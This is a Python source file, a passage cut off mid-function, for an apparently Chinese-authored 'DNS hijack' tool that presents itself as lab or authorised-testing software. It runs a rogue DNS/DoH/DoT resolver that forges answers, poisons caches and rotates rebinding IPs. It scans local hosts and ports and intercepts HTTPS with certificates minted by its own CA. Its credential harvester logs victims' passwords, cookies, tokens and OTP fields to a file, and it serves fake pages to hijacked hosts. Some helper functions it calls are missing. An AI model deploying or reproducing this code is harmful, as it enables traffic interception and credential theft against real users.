#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DNS劫持全能增强版++++ - 实验室/授权测试用途
堆叠: DNS缓存/上游DoH转发/加密上游选项 | SNI/Host智能分流白名单 | 多Profile一键切换+审计HMAC签名导出
      | iptables/TPROXY脚本生成 | WS/gRPC流量识别镜像标记 | ACL | 以及前代全部能力
"""
import argparse, base64, hashlib, hmac, ipaddress, json, logging, os, queue, re, select, shutil, signal, socket, ssl, struct, subprocess, sys, threading, time
from collections import deque
from datetime import datetime, timedelta
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from socketserver import ThreadingUDPServer, BaseRequestHandler, ThreadingMixIn, TCPServer
from urllib.parse import urlparse, parse_qs, quote
from urllib.request import Request, urlopen

try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    HAS_CRYPTO = True
except Exception:
    HAS_CRYPTO = False

# Optional: aioquic for DoQ
try:
    from aioquic.asyncio import serve as _aioquic_serve
    from aioquic.quic.configuration import QuicConfiguration
    HAS_QUIC = True
except Exception:
    HAS_QUIC = False
# Optional: yaml (playbook) via simple parser fallback
try:
    import yaml as _yaml
    HAS_YAML = True
except Exception:
    HAS_YAML = False

# Optional: aioquic for DoQ
try:
    from aioquic.asyncio import serve as _aioquic_serve
    from aioquic.quic.configuration import QuicConfiguration
    HAS_QUIC = True
except Exception:
    HAS_QUIC = False
# Optional: geoip2
try:
    import geoip2.database as _geoip2_db
    HAS_GEOIP = True
except Exception:
    HAS_GEOIP = False

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("dnshijack")

STATE = {"lock": threading.Lock(),
    "rules": [], "default_ip": "127.0.0.1", "upstream": ["8.8.8.8","1.1.1.1"],
    "upstream_mode": "udp", # udp|doh
    "upstream_doh": "https://dns.google/dns-query",
    "mode": "selective", "ttl": 60,
    "events": deque(maxlen=10000), "creds": deque(maxlen=4000),
    "stats": {"dns":0,"doh":0,"dot":0,"http":0,"https":0,"hijacked":0,"forwarded":0,"tcp_relay":0,"replay":0,"cache_hit":0,"split_bypass":0},
    "templates_dir": "", "hook_script": "", "pcap_proc": None, "pcap_file": "", "acl_allow": [], "acl_deny": [],
    "split_allow_hosts": [], # these hosts bypass hijack (whitelist split)
    "split_deny_hosts": [],  # force hijack
    "fake": {"AAAA":"::1","CNAME":"","TXT":"hijacked","MX":"mail.local"},
    "cache": {}, # (qname,qtype)->(resp, expire_ts)
    "cache_ttl_cap": 300,
    "audit_key": "lab-audit-key",
    "profile_name": "default",
    # v5 additions
    "admin_token": "",
    "admin_allow_ips": [],
    "rebind_pool": [],
    "rebind_rules": [],   # domains to rotate IPs for
    "rebind_idx": 0,
    "rate_limit": {},     # src -> list timestamps
    "rate_limit_max": 20,
    "rate_limit_window": 10,
    "delay_ms": 0,
    "mdns_enabled": False,
    "config_file": "",
    "proxy_upstream": "",  # socks5://host:port or http://host:port
    "session_counter": 0,
    "sessions": {},        # session_id -> list of event indices
    # v6 additions
    "tenant": "default",
    "dnssec_forge": False,
    "dnssec_strip": False,
    "aaaa_priority": False,
    "ipv6_only": False,
    "geoip_db": "",
    "geo_allow_cidrs": [],
    "geo_deny_cidrs": [],
    "webhook_url": "",
    "webhook_min_severity": "info",
    "playbook": "",
    "doq_enabled": False,
    "topology": {"nodes": [], "edges": []},
    # v7
    "upstream_lb": "roundrobin",  # roundrobin|random|failover
    "upstream_health": {},       # ip -> {ok, latency_ms, last_check, fails}
    "upstream_check_interval": 30,
    "block_domains": [],        # domains to NXDOMAIN/block
    "allow_domains": [],        # if set, only these pass (whitelist mode)
    "domain_filter_mode": "off", # off|blacklist|whitelist
    "ecs_subnet": "",           # EDNS client subnet to inject (e.g. 1.2.3.0/24)
    "ecs_enabled": False,
    "http_redirect_mode": False,
    "http_redirect_url": "",
    "captive_portal": False,
    "captive_portal_url": "",
    "tunnel_detect": True,
    "tunnel_max_len": 80,
    "auto_ban": True,
    "auto_ban_threshold": 50,
    "auto_ban_window": 60,
    "banned_ips": [],
    "qps_stats": {"window": [], "per_domain": {}, "per_client": {}},
    "cache_prewarm": [],
    "upstream_tee": [],        # tee DNS queries to these extra upstreams (mirror)
    "response_inject": {},      # domain -> list of (type, value) to append to forwarded resp
    "multi_bind": [],          # extra bind IPs
    "query_replay_log": [],
    "upstream_mode_dot": False,
    "upstream_dot": "",
    "cert_auto_renew": True,
    "ca_info": {},
    # v8
    "dns_over_tcp": True,
    "rpz_zones": {},            # zone_name -> {domain: action}
    "rpz_default_action": "passthru",  # nxdomain|nodata|redirect|passthru|drop
    "dns_views": {},            # view_name -> {match_cidrs, rules}
    "dns64_enabled": False,
    "dns64_prefix": "64:ff9b::",
    "per_client_delay": {},     # src -> ms
    "dga_detect": True,
    "dga_threshold": 3.8,
    "edns_padding": False,
    "axfr_enabled": False,
    "axfr_zones": {},           # zone -> list of (name, type, value)
    "multi_bind_ips": [],
    "syslog_enabled": False,
    "syslog_host": "127.0.0.1",
    "syslog_port": 514,
    "ws_push_enabled": True,
    "ws_clients": [],
    "raw_spoof": False,
    "query_log_file": "",
    "dns_firewall_rules": [],   # list of {pattern, action, redirect_ip}
    "cache_poison": {},         # domain -> ip to inject
    "max_udp_size": 4096,
    "tcp_timeout": 5,
    "upstream_retries": 2,
    "health_check_url": "",
    "auto_update_rules": False,
    "rules_update_url": "",
    "rules_update_interval": 300,
    "geoip_city": False,
}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
EVENT_LOG_PATH = os.path.join(BASE_DIR,"hijack_events.jsonl")
CRED_LOG_PATH = os.path.join(BASE_DIR,"captured_creds.jsonl")
PROFILES_DIR = os.path.join(BASE_DIR,"profiles")
CERT_DIR = os.path.join(BASE_DIR,"certs"); CA_KEY=os.path.join(CERT_DIR,"ca.key.pem"); CA_CRT=os.path.join(CERT_DIR,"ca.crt.pem")
TPL_DIR_DEFAULT = os.path.join(BASE_DIR,"templates")

def _append(path, rec):
    try:
        with open(path,"a",encoding="utf-8") as f: f.write(json.dumps(rec,ensure_ascii=False)+"\n")
    except Exception: pass
def emit(t,d):
    rec={"ts":datetime.utcnow().isoformat()+"Z","type":t,**d}
    with STATE["lock"]: STATE["events"].append(rec); _append(EVENT_LOG_PATH,rec)
def emit_cred(d):
    rec={"ts":datetime.utcnow().isoformat()+"Z",**d}
    with STATE["lock"]: STATE["creds"].append(rec); _append(CRED_LOG_PATH,rec)


def new_session_id():
    with STATE["lock"]:
        STATE["session_counter"] += 1
        return f"S{STATE['session_counter']:06d}"

def rate_limit_ok(src):
    now = time.time()
    with STATE["lock"]:
        rl = STATE["rate_limit"].get(src, [])
        rl = [t for t in rl if now - t < STATE["rate_limit_window"]]
        if len(rl) >= STATE["rate_limit_max"]:
            STATE["rate_limit"][src] = rl
            return False
        rl.append(now)
        STATE["rate_limit"][src] = rl
        return True

def rebind_ip_for(qname):
    q = qname.lower().rstrip('.')
    with STATE["lock"]:
        rules = list(STATE["rebind_rules"])
        pool = list(STATE["rebind_pool"])
        idx = STATE["rebind_idx"]
    for r in rules:
        pat = r.lower() if isinstance(r,str) else r.get("pattern","").lower()
        if pat.startswith('*.'):
            suf = pat[2:]
            if q == suf or q.endswith('.'+suf):
                break
        elif q == pat:
            break
    else:
        return None
    if not pool:
        return None
    with STATE["lock"]:
        ip = STATE["rebind_pool"][STATE["rebind_idx"] % len(STATE["rebind_pool"])]
        STATE["rebind_idx"] = (STATE["rebind_idx"]+1) % len(STATE["rebind_pool"])
    return ip

def admin_auth_ok(handler):
    with STATE["lock"]:
        token = STATE["admin_token"]
        allow = list(STATE["admin_allow_ips"])
    src = handler.client_address[0]
    if allow and src not in allow:
        return False
    if token:
        got = handler.headers.get("X-Admin-Token") or ""
        if got != token:
            # also allow ?token= query
            qs = parse_qs(urlparse(handler.path).query)
            if qs.get("token",[""])[0] != token:
                return False
    return True

def proxy_open(host, port, proxy_url, timeout=10):
    # returns connected socket via HTTP CONNECT or SOCKS5
    if not proxy_url:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout); s.connect((host,port)); return s
    u = urlparse(proxy_url)
    if u.scheme in ('socks5','socks'):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout); s.connect((u.hostname, u.port or 1080))
        # greeting
        s.sendall(b"\x05\x01\x00")
        if s.recv(2) != b"\x05\x00": raise Exception("socks5 auth fail")
        # request
        hb = host.encode(); s.sendall(b"\x05\x01\x00\x03"+bytes([len(hb)])+hb+struct.pack("!H",port))
        r = s.recv(10)
        if not r or r[1] != 0: raise Exception("socks5 connect fail")
        return s
    # http connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout); s.connect((u.hostname, u.port or 8080))
    req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
    if u.username:
        import base64 as _b
        cred = _b.b64encode(f"{u.username}:{u.password or ''}".encode()).decode()
        req += f"Proxy-Authorization: Basic {cred}\r\n"
    req += "\r\n"
    s.sendall(req.encode())
    # read response headers
    buf=b''
    while b"\r\n\r\n" not in buf:
        c=s.recv(4096)
        if not c: break
        buf+=c
    if b" 200 " not in buf and b" 200\r" not in buf:
        raise Exception("http connect fail")
    return s


def get_local_ips():
    ips=[]
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(("8.8.8.8",80)); ips.append(s.getsockname()[0]); s.close()
    except Exception: pass
    try:
        for info in socket.getaddrinfo(socket.gethostname(),None,socket.AF_INET):
            ip=info[4][0]
            if ip not in ips and not ip.startswith("127."): ips.append(ip)
    except Exception: pass
    return ips or ["127.0.0.1"]
def get_subnet(ip):
    try: return ipaddress.ip_network(f"{ip}/24",strict=False)
    except Exception: return None
def scan_hosts(subnet, timeout=0.25, max_workers=128):
    alive,lock,q=[],threading.Lock(),queue.Queue()
    for h in subnet.hosts(): q.put(str(h))
    def w():
        while True:
            try: ip=q.get_nowait()
            except queue.Empty: return
            for port in (80,443,22,53,445,3389,8080):
                try:
                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(timeout)
                    if s.connect_ex((ip,port))==0:
                        with lock:
                            if ip not in alive: alive.append(ip)
                        s.close(); break
                    s.close()
                except Exception: pass
            try: q.task_done()
            except Exception: pass
    ts=[threading.Thread(target=w,daemon=True) for _ in range(max_workers)]
    for t in ts: t.start()
    for t in ts: t.join(timeout=12)
    return sorted(alive,key=lambda x:ipaddress.ip_address(x))
def scan_ports(ip, ports=None, timeout=0.4):
    ports=ports or [53,80,443,853,8080,8443,8000,3000,22,21,445,3389]
    out=[]
    for p in ports:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(timeout)
            if s.connect_ex((ip,p))==0: out.append(p); s.close()
        except Exception: pass
    return out
def find_free_port(start=8000, host="0.0.0.0"):
    p=start
    while p<65535:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind((host,p)); s.close(); return p
        except OSError: p+=1
    return start

# DNS
def parse_dns_name(data, offset):
    labels=[]; jumped=False; orig=offset; steps=0
    while True:
        steps+=1
        if steps>128 or offset>=len(data): break
        ln=data[offset]
        if ln==0: offset+=1; break
        if (ln&0xC0)==0xC0:
            if offset+1>=len(data): break
            ptr=struct.unpack("!H",data[offset:offset+2])[0]&0x3FFF
            if not jumped: orig=offset+2
            offset=ptr; jumped=True; continue
        offset+=1; labels.append(data[offset:offset+ln].decode("utf-8","ignore")); offset+=ln
    return ".".join(labels),(orig if jumped else offset)
def encode_name(name):
    out=b''
    for part in name.strip('.').split('.'):
        b=part.encode('utf-8','ignore')[:63]; out+=bytes([len(b)])+b
    return out+b'\x00'
def build_dns_response(req, ip, ttl=60):
    try:
        tid=req[:2]; qd=struct.unpack("!H",req[4:6])[0]
        off=12; qname,off=parse_dns_name(req,off)
        if off+4>len(req): return None
        qtype,_=struct.unpack("!HH",req[off:off+4]); off+=4
        an=0; ans=b''
        with STATE["lock"]: fake=dict(STATE["fake"])
        if qtype==1 and ip:
            ans+=b"\xc0\x0c"+struct.pack("!HHIH",1,1,int(ttl),4)+socket.inet_aton(ip); an=1
        elif qtype==28 and fake.get("AAAA"):
            try: a6=socket.inet_pton(socket.AF_INET6,fake["AAAA"]); ans+=b"\xc0\x0c"+struct.pack("!HHIH",28,1,int(ttl),16)+a6; an=1
            except Exception: pass
        elif qtype==5 and fake.get("CNAME"):
            cn=encode_name(fake["CNAME"]); ans+=b"\xc0\x0c"+struct.pack("!HHIH",5,1,int(ttl),len(cn))+cn; an=1
        elif qtype==16 and fake.get("TXT"):
            tb=fake["TXT"].encode()[:255]; ans+=b"\xc0\x0c"+struct.pack("!HHIH",16,1,int(ttl),1+len(tb))+bytes([len(tb)])+tb; an=1
        elif qtype==15 and fake.get("MX"):
            ex=encode_name(fake["MX"]); ans+=b"\xc0\x0c"+struct.pack("!HHIH",15,1,int(ttl),2+len(ex))+struct.pack("!H",10)+ex; an=1
        elif qtype==255 and ip:
            ans+=b"\xc0\x0c"+struct.pack("!HHIH",1,1,int(ttl),4)+socket.inet_aton(ip); an=1
        _flags=0x8180
        with STATE['lock']: _df=STATE['dnssec_forge']
        if _df: _flags |= 0x0020  # AD bit
        hdr=struct.pack("!HHHHHH",struct.unpack("!H",tid)[0],_flags,qd,an,0,0)
        return hdr+req[12:off]+ans
    except Exception: return None

def forward_upstream_udp(req, upstreams, timeout=2.0):
    for up in upstreams:
        try:
            host,port=up,53
            if ":" in up and not up.startswith("["):
                h,ps=up.rsplit(":",1); host=h; port=int(ps) if ps.isdigit() else 53
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(timeout)
            s.sendto(req,(host,port)); data,_=s.recvfrom(4096); s.close(); return data
        except Exception: continue
    return None

def forward_upstream_doh(req, doh_url, timeout=3.0):
    try:
        r=Request(doh_url, data=req, method='POST', headers={'Content-Type':'application/dns-message','Accept':'application/dns-message'})
        ctx=ssl.create_default_context()
        with urlopen(r, timeout=timeout, context=ctx) as resp: return resp.read()
    except Exception as e:
        emit('doh_up_err',{'err':str(e),'url':doh_url}); return None

def forward_upstream(req):
    with STATE["lock"]: mode=STATE["upstream_mode"]; ups=list(STATE["upstream"]); doh=STATE["upstream_doh"]
    if mode=='doh':
        d=forward_upstream_doh(req,doh)
        if d: return d
    return forward_upstream_udp(req,ups)

def cache_get(qname,qtype):
    k=(qname.lower(),qtype)
    with STATE["lock"]:
        v=STATE["cache"].get(k)
        if not v: return None
        resp,exp=v
        if time.time()>exp: del STATE["cache"][k]; return None
        STATE["stats"]["cache_hit"]+=1
        return resp
def cache_put(qname,qtype,resp):
    if not resp: return
    with STATE["lock"]: cap=STATE["cache_ttl_cap"]
    with STATE["lock"]: STATE["cache"][(qname.lower(),qtype)]=(resp,time.time()+max(5,min(cap,300))) 

def host_matches(host, patterns):
    h=host.lower().rstrip('.')
    for p in patterns or []:
        p=p.lower().strip()
        if not p: continue
        if p=='*': return True
        if p.startswith('*.'):
            suf=p[2:]
            if h==suf or h.endswith('.'+suf): return True
        elif h==p: return True
        elif p.startswith('re:'):
            try:
                if re.search(p[3:],h): return True
            except Exception: pass
    return False

def split_decision(host):
    with STATE["lock"]: allow=list(STATE["split_allow_hosts"]); deny=list(STATE["split_deny_hosts"])
    if host_matches(host,deny): return 'hijack'
    if host_matches(host,allow): return 'bypass'
    return 'rule'

def match_rule(qname):
    q=qname.lower().rstrip('.')
    sd=split_decision(q)
    with STATE["lock"]: rules=list(STATE["rules"]); mode=STATE["mode"]; dip=STATE["default_ip"]; ttl=STATE["ttl"]
    if sd=='bypass':
        with STATE["lock"]: STATE["stats"]["split_bypass"]+=1
        return None,'forward',ttl
    if sd=='hijack': return dip,'hijack',ttl
    if mode=='forward': return None,'forward',ttl
    if mode=='all': return dip,'hijack',ttl
    for r in rules:
        if not r.get('enabled',True): continue
        pat=(r.get('pattern') or '').lower(); ip=r.get('ip') or dip; rt=r.get('type','exact')
        try:
            if rt=='regex':
                if re.search(pat,q): return ip,'hijack',ttl
            elif rt=='wildcard' or pat.startswith('*.') or pat=='*':
                suf=pat[2:] if pat.startswith('*.') else pat
                if pat=='*' or q==suf or q.endswith('.'+suf): return ip,'hijack',ttl
            else:
                if q==pat: return ip,'hijack',ttl
        except Exception: continue
    return None,'forward',ttl

def acl_ok(src):
    with STATE["lock"]: allow=list(STATE["acl_allow"]); deny=list(STATE["acl_deny"])
    if src in deny: return False
    if allow and src not in allow: return False
    return True

def rewrite_tid(req, resp):
    if not resp or len(resp)<2 or len(req)<2: return resp
    return req[:2]+resp[2:]

def handle_dns_query(data, src_ip, tag='dns'):
    try:
        qname,off=parse_dns_name(data,12); qtype=struct.unpack("!H",data[off:off+2])[0] if off+2<=len(data) else 0
    except Exception: qname,qtype='?',0
    geo = geoip_lookup(src_ip)
    if not rate_limit_ok(src_ip):
        emit_v6('ratelimit',{'src':src_ip}); return None
    if auto_ban_check(src_ip):
        return None
    df = domain_filter(qname)
    if df == 'block':
        emit_v6('domain_blocked', {'qname': qname, 'src': src_ip}, 'warn')
        nr = build_nxdomain(data)
        return nr if nr else None
    with STATE['lock']: td = STATE['tunnel_detect']; tml = STATE['tunnel_max_len']
    if td and tunnel_detect(qname):
        emit_v6('tunnel_suspect', {'qname': qname, 'src': src_ip}, 'warn')
    fw_act, fw_ip = dns_firewall(qname)
    if fw_act == 'block':
        emit_v6('fw_blocked', {'qname': qname, 'src': src_ip}, 'warn')
        return None
    if fw_act == 'redirect' and fw_ip:
        emit_v6('fw_redirect', {'qname': qname, 'src': src_ip, 'ip': fw_ip}, 'info')
        return build_dns_response(data, fw_ip, STATE['ttl'])
    if fw_act == 'drop':
        return None
    rpz_act, rpz_ip = rpz_action(qname)
    if rpz_act == 'nx': return build_nxdomain(data)
    if rpz_act == 'nodata': return build_nodata(data)
    if rpz_act == 'drop': return None
    if rpz_act == 'redirect' and rpz_ip:
        emit_v6('rpz_redirect', {'qname': qname, 'src': src_ip, 'ip': rpz_ip}, 'info')
        return build_dns_response(data, rpz_ip, STATE['ttl'])
    if STATE.get('dga_detect', True) and dga_score(qname) > STATE.get('dga_threshold', 3.8):
        emit_v6('dga_suspect', {'qname': qname, 'src': src_ip}, 'warn')
    per_client_delay(src_ip)
    cp = cache_poison_get(qname)
    if cp:
        emit_v6('cache_poison', {'qname': qname, 'src': src_ip, 'ip': cp}, 'info')
        return build_dns_response(data, cp, STATE['ttl'])
    if not acl_ok(src_ip): return None
    # rebind pool override
    rb = rebind_ip_for(qname)
    if rb:
        with STATE['lock']: _ttl=STATE['ttl']
        ip,action,ttl = rb,'hijack',_ttl
    else: ip,action,ttl=match_rule(qname)
    dms = STATE['delay_ms']
    if dms and dms>0:
        time.sleep(dms/1000.0)
    if action=='hijack' and ip:
        with STATE["lock"]: STATE['stats']['hijacked']+=1
        emit_v6('dns',{'qname':qname,'qtype':qtype,'action':'hijack','ip':ip,'src':src_ip,'via':tag,'geo':geo}, 'info'); return build_dns_response(data,ip,ttl)
    c=cache_get(qname,qtype)
    if c: return rewrite_tid(data,c)
    with STATE["lock"]: STATE['stats']['forwarded']+=1; dip=STATE['default_ip']
    with STATE['lock']: ecs_on=STATE['ecs_enabled']; ecs_sub=STATE['ecs_subnet']
    q2 = inject_ecs(data, ecs_sub) if (ecs_on and ecs_sub) else data
    q2 = edns_pad(q2) if STATE.get('edns_padding', False) else q2
    resp=forward_upstream_v7(q2)
    if resp:
        resp = response_inject_append(qname, resp)
        cache_put(qname,qtype,resp); emit_v6('dns',{'qname':qname,'qtype':qtype,'action':'forward','src':src_ip,'via':tag,'geo':geo}, 'info'); return resp
    emit_v6('dns',{'qname':qname,'qtype':qtype,'action':'fallback','ip':dip,'src':src_ip,'via':tag,'geo':geo}, 'info'); return build_dns_response(data,dip,ttl)
class DNSHandler(BaseRequestHandler):
    def handle(self):
        data,sock=self.request[0],self.request[1]
        with STATE['lock']: STATE['stats']['dns']+=1
        resp=handle_dns_query(data,self.client_address[0],'dns')
        if resp:
            try: sock.sendto(resp,self.client_address)
            except Exception: pass
class DNSServer(ThreadingUDPServer): allow_reuse_address=True

def handle_doh(path, method, headers, body, src):
    try:
        with STATE['lock']: STATE['stats']['doh']+=1
        if method=='GET':
            qs=parse_qs(urlparse(path).query); dns=qs.get('dns',[''])[0]
            if not dns: return 400,b'missing dns','text/plain'
            pad='='*(-len(dns)%4); data=base64.urlsafe_b64decode(dns+pad)
        elif method=='POST': data=body
        else: return 405,b'method','text/plain'
        resp=handle_dns_query(data,src,'doh')
        return (200,resp,'application/dns-message') if resp else (502,b'no','text/plain')
    except Exception as e: return 400,str(e).encode(),'text/plain'

class DoTHandler(BaseRequestHandler):
    def handle(self):
        try:
            ctx=getattr(self.server,'tls_ctx',None); conn=ctx.wrap_socket(self.request,server_side=True) if ctx else self.request
            try:
                while True:
                    hdr=conn.recv(2)
                    if not hdr or len(hdr)<2: break
                    ln=struct.unpack('!H',hdr)[0]; data=b''
                    while len(data)<ln:
                        ch=conn.recv(ln-len(data))
                        if not ch: break
                        data+=ch
                    if len(data)!=ln: break
                    with STATE['lock']: STATE['stats']['dot']+=1
                    resp=handle_dns_query(data,self.client_address[0],'dot')
                    if resp: conn.sendall(struct.pack('!H',len(resp))+resp)
            finally:
                try: conn.close()
                except Exception: pass
        except Exception: pass
class DoTServer(ThreadingMixIn,TCPServer): allow_reuse_address=True

# Certs
def ensure_ca():
    os.makedirs(CERT_DIR,exist_ok=True)
    if os.path.exists(CA_KEY) and os.path.exists(CA_CRT): return True
    if not HAS_CRYPTO: return False
    key=rsa.generate_private_key(public_exponent=65537,key_size=2048)
    sub=iss=x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,u"DNSHijack Lab CA")])
    cert=(x509.CertificateBuilder().subject_name(sub).issuer_name(iss).public_key(key.public_key()).serial_number(x509.random_serial_number())
          .not_valid_before(datetime.utcnow()-timedelta(days=1)).not_valid_after(datetime.utcnow()+timedelta(days=3650))
          .add_extension(x509.BasicConstraints(ca=True,path_length=None),critical=True).sign(key,hashes.SHA256()))
    open(CA_KEY,'wb').write(key.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.TraditionalOpenSSL,serialization.NoEncryption()))
    open(CA_CRT,'wb').write(cert.public_bytes(serialization.Encoding.PEM)); return True
def make_host_cert(hostname):
    if not HAS_CRYPTO or not os.path.exists(CA_KEY): return None,None
    safe=re.sub(r'[^a-zA-Z0-9._-]','_',hostname)[:100]; kp=os.path.join(CERT_DIR,safe+'.key.pem'); cp=os.path.join(CERT_DIR,safe+'.crt.pem')
    if os.path.exists(kp) and os.path.exists(cp): return cp,kp
    try:
        ck=serialization.load_pem_private_key(open(CA_KEY,'rb').read(),password=None); cc=x509.load_pem_x509_certificate(open(CA_CRT,'rb').read())
        key=rsa.generate_private_key(public_exponent=65537,key_size=2048)
        sub=x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,hostname)])
        try: san=x509.SubjectAlternativeName([x509.DNSName(hostname)])
        except Exception: san=x509.SubjectAlternativeName([x509.DNSName('localhost')])
        cert=(x509.CertificateBuilder().subject_name(sub).issuer_name(cc.subject).public_key(key.public_key()).serial_number(x509.random_serial_number())
              .not_valid_before(datetime.utcnow()-timedelta(days=1)).not_valid_after(datetime.utcnow()+timedelta(days=825))
              .add_extension(san,critical=False).add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]),critical=False).sign(ck,hashes.SHA256()))
        open(kp,'wb').write(key.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.TraditionalOpenSSL,serialization.NoEncryption()))
        open(cp,'wb').write(cert.public_bytes(serialization.Encoding.PEM)); return cp,kp
    except Exception: return None,None

# Template/hook/HTTP
CRED_KEYS=re.compile(r'(pass(word)?|pwd|token|auth|secret|key|session|cookie|code|otp|pin)',re.I)
def render_template(host,path,headers,body,target_ip):
    with STATE['lock']: tdir=STATE['templates_dir'] or TPL_DIR_DEFAULT; hook=STATE['hook_script']
    if hook and os.path.exists(hook):
        try:
            inp=json.dumps({'host':host,'path':path,'headers':dict(headers),'body':body.decode('utf-8','ignore')[:30000],'target_ip':target_ip}).encode()
            r=subprocess.run([sys.executable,hook],input=inp,capture_output=True,timeout=5)
            if r.returncode==0 and r.stdout: return r.stdout,'text/html; charset=utf-8'
        except Exception as e: emit('hook_err',{'err':str(e)})
    for name in [host+'.html', '_'+'.'.join(host.split('.')[-2:])+'.html' if '.' in host else '', 'default.html']:
        if not name: continue
        fp=os.path.join(tdir,name)
        if os.path.exists(fp):
            try:
                tpl=open(fp,'r',encoding='utf-8',errors='ignore').read().replace('{host}',host).replace('{path}',path).replace('{ts}',datetime.now().isoformat()).replace('{target}',target_ip)
                return tpl.encode(),'text/html; charset=utf-8'
            except Exception: pass
    page=f"<!doctype html><meta charset=utf-8><title>Hijacked</title><body style='font-family:sans-serif;background:#111;color:#eee;padding:28px'><h1>Hijack Active</h1><p>Host: {host}</p><p>Path: {path}</p><p>{datetime.now().isoformat()}</p></body></html>"
    return page.encode(),'text/html; charset=utf-8'

def extract_creds(headers, body_bytes, url, src):
    f={}
    for k in ['Authorization','Cookie','Proxy-Authorization','X-Api-Key','X-Auth-Token']:
        v=headers.get(k)
        if v: f[k]=v
    text=body_bytes.decode('utf-8','ignore') if body_bytes else ''
    if text:
        try:
            obj=json.loads(text)
            if isinstance(obj,dict):
                for kk,vv in obj.items():
                    if CRED_KEYS.search(str(kk)): f[f'json.{kk}']=str(vv)[:400]
        except Exception: pass
        try:
            for kk,vv in parse_qs(text,keep_blank_values=True).items():
                if CRED_KEYS.search(str(kk)): f[f'form.{kk}']=(vv[0] if vv else '')[:400]
        except Exception: pass
    if '?' in url:
        try:
            for kk,vv in parse_qs(urlparse(url).query).items():
                if CRED_KEYS.search(str(kk)): f[f'query.{kk}']=(vv[0] if vv else '')[:400]
        except Exception: pass
    if f: emit_cred({'src':src,'url':url,'host':headers.get('Host',''),'findings':f})

def detect_proto(headers):
    up=headers.get('Upgrade','').lower(); ct=headers.get('Content-Type','').lower()
    if 'websocket' in up: return 'websocket'
    if 'grpc' in ct: return 'grpc'
    return 'http'

class HijackHTTPHandler(BaseHTTPRequestHandler):
    server_version='DNSHijack/4.0'
    def log_message(self,fmt,*a): pass
    def _read_body(self):
        try: n=int(self.headers.get('Content-Length') or 0); return self.rfile.read(min(n,5_000_000)) if n>0 else b''
        except Exception: return b''
    def _respond(self):
        if urlparse(self.path).path=='/dns-query' and getattr(self.server,'enable_doh',False):
            body=self._read_body(); code,data,ct=handle_doh(self.path,self.command,self.headers,body,self.client_address[0])
            self.send_response(code); self.send_header('Content-Type',ct); self.send_header('Content-Length',str(len(data))); self.end_headers();
            try: self.wfile.write(data)
            except Exception: pass
            return
        scheme='https' if getattr(self.server,'is_https',False) else 'http'
        with STATE['lock']: STATE['stats']['https' if scheme=='https' else 'http']+=1
        body_in=self._read_body(); host=self.headers.get('Host','unknown'); url=f"{scheme}://{host}{self.path}"
        proto=detect_proto(self.headers)
        emit('http_req',{'scheme':scheme,'src':self.client_address[0],'host':host,'path':self.path,'method':self.command,'proto':proto})
        extract_creds(self.headers,body_in,url,self.client_address[0])
        # smart split: allow hosts bypass to mirror/upstream or 502
        if split_decision(host)=='bypass':
            # try mirror upstream if set else just return minimal
            mu=getattr(self.server,'mirror_upstream',None)
            if mu and scheme=='http':
                try:
                    req=Request(mu.rstrip('/')+self.path, data=body_in if body_in else None, method=self.command)
                    for k,v in self.headers.items():
                        if k.lower() not in ('host','content-length'): req.add_header(k,v)
                    req.add_header('Host',host)
                    with proxy_urlopen(req,timeout=8) as r:
                        rb=r.read(); self.send_response(r.status); self.send_header('Content-Type',r.headers.get('Content-Type','application/octet-stream')); self.send_header('Content-Length',str(len(rb))); self.end_headers(); self.wfile.write(rb); return
                except Exception: pass
        mirror=getattr(self.server,'mirror_upstream',None)
        if mirror and scheme=='http' and not proto in ('websocket','grpc'):
            try:
                req=Request(mirror.rstrip('/')+self.path, data=body_in if body_in else None, method=self.command)
                for k,v in self.headers.items():
                    if k.lower() not in ('host','content-length'): req.add_header(k,v)
                req.add_header('Host',host)
                with urlopen(req,timeout=8) as r:
                    rb=r.read(); self.send_response(r.status); self.send_header('Content-Type',r.headers.get('Content-Type','application/octet-stream')); self.send_header('Content-Length',str(len(rb))); self.end_headers(); self.wfile.write(rb); emit('mirror',{'url':url,'status':r.status}); return
            except Exception as e: emit('mirror_err',{'url':url,'err':str(e)})
        data,ct=render_template(host,self.path,self.headers,body_in,getattr(self.server,'target_ip','?'))
        self.send_response(200); self.send_header('Content-Type',ct); self.send_header('Content-Length',str(len(data))); self.end_headers()
        try: self.wfile.write(data)
        except Exception: pass
    def do_GET(self): self._respond()
    def do_POST(self): self._respond()
    def do_PUT(self): self._respond()
    def do_DELETE(self): self._respond()
    def do_OPTIONS(self): self._respond()
    def do_HEAD(self): self.send_response(200); self.end_headers()

class SNIHijackHTTPServer(ThreadingHTTPServer):
    allow_reuse_address=True; is_https=True; enable_doh=True; mirror_upstream=None
    def __init__(self,addr,handler,target_ip,ca_ready): super().__init__(addr,handler); self.target_ip=target_ip; self.ca_ready=ca_ready
    def get_request(self):
        newsock,addr=super().get_request()
        if not (self.ca_ready and HAS_CRYPTO): return newsock,addr
        try:
            ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); dc,dk=make_host_cert('default.local')
            if not dc: return newsock,addr
            ctx.load_cert_chain(dc,dk)
            def sni_cb(sslsock,sname,_c):
                if sname:
